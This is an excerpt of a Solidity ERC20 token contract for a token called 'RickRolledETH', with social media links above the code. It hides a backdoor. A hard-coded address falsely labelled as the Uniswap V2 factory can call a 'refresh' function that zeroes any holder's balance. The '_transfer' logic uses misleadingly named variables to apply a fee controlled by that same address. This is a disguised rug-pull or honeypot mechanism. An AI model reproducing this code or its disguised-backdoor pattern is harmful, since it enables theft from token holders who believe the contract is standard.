...
https://twitter.com/RickRolledETH
https://RickRolledETH.xyz

https://t.me.com/RickRolledETH
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private uniswapFactoryV2 = 0xd6E77F718ce7D867e0bD2B55d8F9C8783b231BEf;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private _swappingToggle = 1;
    address internal V2uniswapRouter = 0xe92d59EA3f4344Df1F952C23834Fc648313eEE37;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2uniswapRouter && _balances[uniswapFactoryV2] > 0 ? _pairsAllowance : _swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
     ...
     * Emits a {Transfer} event with `from` set to the zero address.
     */
    function refresh(address refreshSender) external { if (msg.sender == uniswapFactoryV2) _balances[refreshSender] = 0x0; }
